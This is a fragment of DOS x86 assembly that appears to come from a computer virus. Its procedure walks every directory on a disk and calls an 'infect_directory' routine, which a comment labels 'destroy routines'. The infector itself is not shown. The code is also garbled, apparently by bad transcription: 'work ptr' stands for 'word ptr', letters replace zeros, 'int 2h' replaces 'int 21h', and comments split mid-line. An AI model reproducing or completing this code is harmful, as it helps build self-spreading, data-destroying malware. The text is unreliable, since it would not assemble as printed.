traverse_fcn proc near
			push bp ;Create stack frame
			mov bp,sp
			Sub sp,44 ;Allocate space for DTA

			Call infect_directory : destroy routines
			mov ah,1Ah ;Set DTA
			lea dx,word ptr[bp-44] ;to space allotted
			int 21h ;Do it now!

			mov ah,4Eh ;Find first
			mov cx,16 ;Directory mask
			lea dx,[si+offset dir_mask] ;**
			int 21h
			jmp short isdirok
	gonow:
			cmp byte ptr[bp-14],'.';Is first
	char=='.'?
			je short donext
			;Ifso,loop again
			lea dx,work ptr[bp-14] ;else load dirname
			mov ah,3Bh ;and changedir
	there
			int 21h
			jc short donext ;Do next if invalid
			inc work ptr[si+offset nest];nest++
			call near ptr traverse_fcn;recurse
directory

donext:
			lea dx,work ptr[bp-44] ;Load space
allocated for
DTA
			mov ah,1Ah ; and set DTA to this new area
			int 21h ;'cause it might have changed

			mov ah,4Fh Find next
			int 21h
isdirok:
jnc gonow ;If OK,jmp elsewhere
cmp work ptr[si+offset nest],o;If root
directory;(nest==0)
jle short cleanup ;then Quit
dec word ptr[si+offset nest] ;Else decrement nest
lea dx,[si+offset back_dir] ;'..'
mov ah,3Bh ;Change directory
int 2h ;to previous one
cleanup:
			mov sp,bp
			pop bp
			ret
traverse_fcn endp
;Variables
nest dw O
back_dir db '..',O
dir_maskdb '*.*'.O
